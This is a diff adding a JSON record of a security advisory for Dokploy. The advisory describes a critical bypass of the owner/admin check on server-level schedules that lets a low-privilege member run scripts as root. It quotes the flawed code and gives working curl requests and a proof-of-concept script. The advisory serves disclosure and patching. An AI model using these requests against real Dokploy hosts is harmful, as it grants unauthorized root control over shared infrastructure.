@@ -1,0 +1,51 @@
+{
+  "global": null,
+  "id": "GHSA-r89g-h7x9-phr2",
+  "repo": {
+    "cve_id": "CVE-2026-72886",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-269",
+      "CWE-863"
+    ],
+    "description": "### Summary\r\nA low-privilege Dokploy member can run commands as root on the host that Dokploy runs on. The member needs no host-access flags, only permission to create a service and access to one application. Dokploy lets only owners and admins create host-level schedules (the `server` and `dokploy-server` types). That owner/admin check runs only when the schedule request is not tied to an application or compose service. A member who ties the request to an application it can access skips the check: Dokploy validates service access instead, never runs the owner/admin check, and the member's `dokploy-server` schedule runs its script as root.\r\n\r\n### Details\r\n`schedule.create` (`apps/dokploy/server/api/routers/schedule.ts:30-77`) is a `protectedProcedure`. It derives `serviceId` from caller input and branches on it; the owner/admin gate (the CVE-2026-45632 fix) lives only in the `else` branch:\r\n\r\n```ts\r\nconst serviceId = input.applicationId || input.composeId;   // attacker-controlled\r\nif (serviceId) {\r\n    await checkServicePermissionAndAccess(ctx, serviceId, { schedule: [\"create\"] });  // service access only\r\n} else {\r\n    await checkPermission(ctx, { schedule: [\"create\"] });\r\n    if (input.scheduleType === \"server\" || input.scheduleType === \"dokploy-server\") {\r\n        const member = await findMemberByUserId(ctx.user.id, ctx.session.activeOrganizationId);\r\n        if (member.role !== \"owner\" && member.role !== \"admin\") {   // THE GATE (only on this branch)\r\n            throw new TRPCError({ code: \"FORBIDDEN\", message: \"Only owners and admins can manage server-level schedules.\" });\r\n        }\r\n    }\r\n}\r\n```\r\n\r\nBecause `serviceId` comes from the caller, a member sends a `dokploy-server` schedule together with an `applicationId` it can access. The request takes the `if` branch, which only verifies service access, so the owner/admin check never runs. From there it is the same root execution CVE-2026-45632 addressed: a `dokploy-server` schedule runs its member-supplied script via `bash -c` as root (`packages/server/src/utils/schedules/utils.ts:127-135`, run by `schedule.runManually`). `schedule.update` has the same structure.\r\n\r\n### PoC\r\n\r\n[poc.py](https://github.com/user-attachments/files/29250338/poc.py) bootstraps an owner on a fresh instance, creates a member scoped to one application, then runs the exploit as that member. It can also sign in as an existing member with `--user-email` and `--application-id`.\r\n\r\n```bash\r\npython3 poc.py --url http://127.0.0.1:3000\r\n# existing instance: add --owner-email you@example.com --owner-pass '...'\r\n```\r\n\r\nIt sends the negative control first, then the bypass. The control has no `applicationId`, so it takes the no-service branch where the owner/admin gate runs. The bypass adds an accessible `applicationId`, which switches the request to the service-access branch; that branch does not repeat the host-schedule owner/admin check.\r\n\r\n```text\r\nschedule.create {scheduleType:\"dokploy-server\", /* no applicationId */}\r\n  -> FORBIDDEN  \"Only owners and admins can manage server-level schedules.\"\r\n\r\nschedule.create {scheduleType:\"dokploy-server\", applicationId:\"<member's app>\", script:\"id; ...\"}\r\n  -> 200 OK  ;  schedule.runManually -> script runs as root\r\n```\r\n\r\nCurl reproduction, authenticated as the member (better-auth session cookie):\r\n\r\n```sh\r\n# negative control (no applicationId) -> the gate fires:\r\ncurl -s -b member.cookies -H 'Content-Type: application/json' -X POST \"$URL/api/trpc/schedule.create?batch=1\" \\\r\n  -d '{\"0\":{\"json\":{\"name\":\"c\",\"cronExpression\":\"0 0 31 12 *\",\"command\":\"true\",\"shellType\":\"bash\",\"scheduleType\":\"dokploy-server\",\"enabled\":false}}}'\r\n  # -> FORBIDDEN \"Only owners and admins can manage server-level schedules.\"\r\n\r\n# bypass: tie the same request to an accessible application -> accepted:\r\ncurl -s -b member.cookies -H 'Content-Type: application/json' -X POST \"$URL/api/trpc/schedule.create?batch=1\" \\\r\n  -d '{\"0\":{\"json\":{\"name\":\"poc\",\"cronExpression\":\"0 0 31 12 *\",\"command\":\"true\",\"shellType\":\"bash\",\"scheduleType\":\"dokploy-server\",\"applicationId\":\"<member_app_id>\",\"script\":\"id; uname -a\",\"enabled\":false}}}'\r\n  # -> 200 + scheduleId; schedule.runManually then runs the script as root (read back via deployment.readLogs)\r\n```\r\n\r\n### Impact\r\nA non-admin member with access to a single application (the core use of the per-member permission model) runs arbitrary code as root on the Dokploy host, and so controls every other organization, project, and service on the instance. None of the member's host flags (`canAccessToDocker`, `canAccessToSSHKeys`, `canAccessToTraefikFiles`) are consulted on this path. The `dokploy-server` host variant is blocked under `IS_CLOUD`; the `server` (remote-server) variant takes the same bypass and is not cloud-gated. Verified on `v0.29.8`.",
+    "ghsa_id": "GHSA-r89g-h7x9-phr2",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-r89g-h7x9-phr2",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-r89g-h7x9-phr2"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72886"
+      }
+    ],
+    "published_at": "2026-07-21T23:23:02Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Non-admin member gains root on the host by bypassing the owner/admin check on server-level schedules (incomplete fix of CVE-2026-45632)",
+    "updated_at": "2026-08-10T19:37:41Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "docker",
+          "name": "dokploy/dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<=0.29.8"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
